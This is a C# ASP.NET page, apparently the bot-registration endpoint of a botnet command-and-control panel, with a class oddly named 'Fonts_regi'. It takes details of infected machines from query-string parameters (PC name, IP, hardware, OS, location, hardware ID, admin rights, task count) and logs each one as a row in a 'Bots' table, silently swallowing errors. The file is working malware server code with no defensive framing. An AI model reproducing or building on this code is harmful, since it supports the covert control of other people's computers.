﻿using System;
using System.Data.SqlClient;

public partial class Fonts_regi : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        try
        {
            string PCName = Request.QueryString["PCName"];
            string IP = Request.QueryString["IP"];
            string CPU = Request.QueryString["CPU"];
            string GPU = Request.QueryString["GPU"];
            string OS = Request.QueryString["OS"];
            string Country = Request.QueryString["Country"];
            string Region = Request.QueryString["Region"];
            string HWID = Request.QueryString["HWID"];
            string Version = Request.QueryString["Version"];
            string admin = Request.QueryString["admin"];
            string CTask = Request.QueryString["TaskAmount"];
            using (SqlConnection conn = new SqlConnection(Settings.sqlConn))
            {
                conn.Open();
                using (SqlCommand cmd = new SqlCommand("INSERT into Bots (PCName, IP, CPU, GPU, FirstConn, LastConn,OperatingSystem, Country, Region, AntiVirus, HWID, Version, Admin, CTask) values (@PCName, @IP, @CPU, @GPU, @FirstConn, @LastConn, @OperatingSystem, @Country, @Region, @AntiVirus, @HWID, @Version, @Admin, @CTask)", conn))
                {
                    cmd.Parameters.AddWithValue("PCName", PCName);
                    cmd.Parameters.AddWithValue("IP", IP);
                    cmd.Parameters.AddWithValue("CPU", CPU);
                    cmd.Parameters.AddWithValue("GPU", GPU);
                    cmd.Parameters.AddWithValue("FirstConn", Settings.getDate());
                    cmd.Parameters.AddWithValue("LastConn", Settings.getDate());
                    cmd.Parameters.AddWithValue("OperatingSystem", OS);
                    cmd.Parameters.AddWithValue("Country", Country);
                    cmd.Parameters.AddWithValue("Region", Region);
                    cmd.Parameters.AddWithValue("AntiVirus", "none");
                    cmd.Parameters.AddWithValue("HWID", HWID);
                    cmd.Parameters.AddWithValue("Version", Version);
                    cmd.Parameters.AddWithValue("Admin", admin);
                    cmd.Parameters.AddWithValue("CTask", CTask);

                    cmd.ExecuteNonQuery();
                }
            }
        }
        catch { }
    }
}